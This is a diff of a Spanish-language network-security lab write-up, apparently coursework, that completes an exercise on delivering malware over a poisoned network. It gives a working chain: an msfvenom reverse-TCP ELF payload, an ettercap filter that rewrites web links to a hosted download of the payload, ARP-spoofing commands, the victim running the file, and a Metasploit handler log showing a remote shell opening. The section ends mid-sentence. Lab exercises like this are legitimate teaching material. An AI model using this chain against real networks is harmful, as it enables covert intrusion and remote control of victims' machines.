@@ -80,9 +80,74 @@ Mediante `arpspoofing` entre una máquina objeto (víctima) y el router del labo
 Se puede ver en *Statistics > HTTP > Requests*
 
 ## APARTADO G
-> *Apartado incompleto.*
-
 Instale metasploit. Haga un ejecutable que incluya Reverse TCP meterpreter payload para plataformas linux. Inclúyalo en un filtro ettercap y aplique toda su sabiduría en ingeniería social para que una víctima u objetivo lo ejecute.
+
+
+Creamos payload:
+> msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.50 LPORT=4444 -f elf > payload.bin
+
+Subimos el payload a donde sea para poder usarlo (ej tempfiles.org)
+
+Creamos ett.filter
+> cat ett.filter 
+>if (ip.proto == TCP && tcp.src == 80) {
+>	replace("a href", "a href=\"https://tmpfiles.org/dl/207895/payload.bin\">");
+>	msg("replaced href.\n");
+> }
+
+Configuramos
+> etterfilter ett.filter -o ig.ef
+
+Activamos el ip_forwarding
+> echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Encendemos el ettercap con el filtro
+> ettercap -T -F ig.ef -i ens33 -q -M arp:remote //10.11.49.106/ //10.11.48.1/
+
+
+
+Desde el cliente:
+>  lynx http://example.org
+> (Vemos la pagina y nos descargamos el virus)
+
+Damos permisos de ejecucion 
+> chmod +x payload.bin
+
+Ejecutamos el virus
+> ./payload.bin
+
+
+Desde el atacante:
+Entramos en la consola de metasploit
+> msfconsole
+
+´´´bash
+msf6 > use multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload linux/x86/shell/reverse_tcp
+payload => linux/x86/shell/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST 10.11.48.50
+LHOST => 10.11.48.50
+msf6 exploit(multi/handler) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.11.48.50:4444 
+[*] Sending stage (36 bytes) to 10.11.49.106
+[*] Command shell session 1 opened (10.11.48.50:4444 -> 10.11.49.106:56054) at 2022-11-03 13:55:42 +0100
+
+```
+
+Ahora estamos dentro del cliente desde el atacante
+
+Salimos cuando queramos
+> msf6 exploit(multi/handler) > exit
+En la máquina de la víctima simulamos una descarga del href introducido:
+
+
+
+
+
 
 ## APARTADO H
 > *Apartado incompleto*
